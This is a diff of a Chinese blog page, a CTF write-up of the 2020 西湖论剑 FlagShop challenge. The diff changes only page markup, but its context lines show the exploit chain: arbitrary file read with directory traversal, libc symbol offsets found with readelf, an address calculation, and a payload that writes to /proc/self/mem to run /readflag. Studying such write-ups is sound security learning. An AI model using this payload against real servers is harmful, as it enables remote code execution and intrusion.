@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>西湖论剑2020FlagShop复现 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -266,7 +266,7 @@
 <p>      F12查看源码，发现一段js代码</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -296,7 +296,7 @@
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
     <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;backend.php&#34;</span><span class="p">,</span> <span class="p">{</span>
         <span class="nx">readfile</span><span class="o">:</span> <span class="s2">&#34;data/FakeCTFer.txt&#34;</span>
     <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
@@ -329,7 +329,7 @@
 </div><p>      大概就是GET传参<code>readfile</code>或<code>writefile</code>访问<code>/backend.php</code>路由读写文件，此处存在一个<strong>任意文件读取漏洞</strong>，通过<code>readfile</code>可以读取backend.php内容：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -345,7 +345,7 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$offset</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;offset&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;offset&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
 <span class="nv">$buffer</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;buffer&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;buffer&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
 
@@ -364,7 +364,7 @@
 </div><p>      然后利用<strong>目录穿越</strong>读index.php文件内容：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -375,7 +375,7 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]))</span> <span class="p">{</span>
   <span class="nv">$uuid</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;/var/www/html/copy&#34;</span><span class="p">);</span>
@@ -399,10 +399,10 @@
 <p>接下来寻找函数地址：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">readelf -s ./backend.php<span class="se">\?</span><span class="nv">readfile</span><span class="o">=</span>%2Flib%2Fx86_64-linux-gnu%2Flibc-2.19.so <span class="p">|</span> egrep <span class="s2">&#34;\s(system|open)@@&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">readelf -s ./backend.php<span class="se">\?</span><span class="nv">readfile</span><span class="o">=</span>%2Flib%2Fx86_64-linux-gnu%2Flibc-2.19.so <span class="p">|</span> egrep <span class="s2">&#34;\s(system|open)@@&#34;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得到函数偏移地址：</p>
@@ -414,13 +414,13 @@
 <p>计算system函数地址：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">echo</span> <span class="nx">dechex</span><span class="p">(</span><span class="mh">0x7ffff5f40000</span><span class="o">+</span><span class="mh">0x0000000000046590</span><span class="p">);</span>
 <span class="c1">//system函数结果：0x7ffff5f86590
 </span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
@@ -435,7 +435,7 @@
 <p>将文件下载下来，使用下面的脚本计算open函数的偏移。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -513,7 +513,7 @@
 </span><span class="lnt">76
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">function</span> <span class="nf">packlli</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
     <span class="nv">$higher</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     <span class="nv">$lower</span> <span class="o">=</span> <span class="nv">$value</span> <span class="o">&amp;</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span>
@@ -599,10 +599,10 @@
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">readfile</span><span class="o">=/</span><span class="nx">readflag</span><span class="o">&gt;/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">i_o_u_hlq</span><span class="o">&amp;</span><span class="nx">writefile</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">mem</span><span class="o">&amp;</span><span class="nx">buffer</span><span class="o">=%</span><span class="mi">90</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="nx">f8</span><span class="o">%</span><span class="nx">f5</span><span class="o">%</span><span class="nx">ff</span><span class="o">%</span><span class="mi">7</span><span class="nx">f</span><span class="o">&amp;</span><span class="nx">offset</span><span class="o">=</span><span class="mi">15333784</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">readfile</span><span class="o">=/</span><span class="nx">readflag</span><span class="o">&gt;/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">i_o_u_hlq</span><span class="o">&amp;</span><span class="nx">writefile</span><span class="o">=/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">mem</span><span class="o">&amp;</span><span class="nx">buffer</span><span class="o">=%</span><span class="mi">90</span><span class="o">%</span><span class="mi">65</span><span class="o">%</span><span class="nx">f8</span><span class="o">%</span><span class="nx">f5</span><span class="o">%</span><span class="nx">ff</span><span class="o">%</span><span class="mi">7</span><span class="nx">f</span><span class="o">&amp;</span><span class="nx">offset</span><span class="o">=</span><span class="mi">15333784</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>然后读取<code>/tmp/i_o_u_hlq</code>文件获得flag。</p>
